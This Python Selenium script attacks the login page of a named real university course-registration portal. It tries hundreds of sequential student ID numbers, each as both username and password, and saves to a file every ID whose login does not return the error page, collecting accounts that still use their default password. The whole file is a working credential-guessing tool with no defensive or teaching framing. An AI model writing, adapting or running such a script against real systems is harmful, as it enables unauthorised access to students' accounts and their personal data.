from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

options = webdriver.ChromeOptions()
options.add_experimental_option("detach", True)

BATCH_SIZE = 50

def login_and_write_result(browser, username, password, file):
    browser.get("https://daotao.vnu.edu.vn/dkmh/login.asp")

    username_element = browser.find_element(By.ID, "txtLoginId")
    password_element = browser.find_element(By.ID, "txtPassword")

    username_element.send_keys(username)
    password_element.send_keys(password)
    password_element.send_keys(Keys.ENTER)

    url = browser.current_url
    if url != "https://daotao.vnu.edu.vn/dkmh/login.asp?errlogin=err":
        file.write(f"{username}\n")
    
    # log
    print(f"Tried {username}")
    
if __name__ == "__main__":
    count = 0
    output = open("1800-2.txt", "a")
    chrome = webdriver.Chrome(options=options)

    for msv in range(18000500, 18001000):
        if count >= BATCH_SIZE:
            chrome.close()
            print("..reload..")
            chrome = webdriver.Chrome(options=options)
            login_and_write_result(chrome, msv, msv, output)
            count = 0
            count += 1            
        else:
            login_and_write_result(chrome, msv, msv, output)
            count += 1

    output.close()
